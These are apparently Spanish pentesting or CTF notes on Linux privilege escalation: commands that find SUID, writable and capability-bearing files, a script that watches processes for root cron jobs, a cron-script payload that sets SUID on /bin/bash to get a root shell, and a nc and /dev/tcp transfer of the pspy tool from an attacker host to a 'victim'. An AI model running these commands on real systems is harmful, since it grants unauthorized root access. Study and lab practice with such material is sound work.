-- -- 
Comando utilizado para aplicar un barrido en el sistema y detectar binarios con el privilegio SUID.
```bash
find / -type f -perm /4000 -exec ls -l {} \; 2>/dev/null
```

Comando utilizado para aplicar un barrido en el sistema y ver que archivos tienen capacidad de escritura.
```bash
find / -writable 2>/dev/null
```

Comando utilizado para realizar una buscada en el sistema de capabilities asociadas a binarios.
```bash
getcap -r / 2>/dev/null
```

-- - 
## Deteccion y explotacion de tareas Cron

Script en bash para detectar que usuarios estan ejecutando comandos en el sistema:
```bash
#!/bin/bash

old_process=$(ps -eo user,command)

while true; do
        new_process=$(ps -eo user,command)
        diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "procmon|command|kworker"
        old_process=$new_process
done
```

Si luego de ejecutar el anterior script descubrimos que el usuario root esta ejecutando un script mediante una tarea cron, podemos modificar el script y poner esto para escalar privilegios
```bash
#!/bin/bash 

sleep 2 
chmod u+s /bin/bash
```

Una vez hayamos modificado el script y se aplique el privilegio SUID, tenemos que abrir una bash "privilegiada"
```bash 
bash -p 
```

Tambien podriamos usar el script *pspy* para descubrir esto mismo. ---> https://github.com/DominicBreuker/pspy
Luego, para "adentrarlo" en la maquina victima lo podemos hacer de la siguiente manera (sin uso de curl, wget, etc)
```bash
# Atacante:
nc -nlvp 443 < pspy
md5sum pspy
# Victima 
cat < /dev/tcp/192.168.64.128/443 > pspy
md5sum pspy
# Si los 2 hashes son iguales es que el script fue transferido de forma exitosa.
```
-- - 


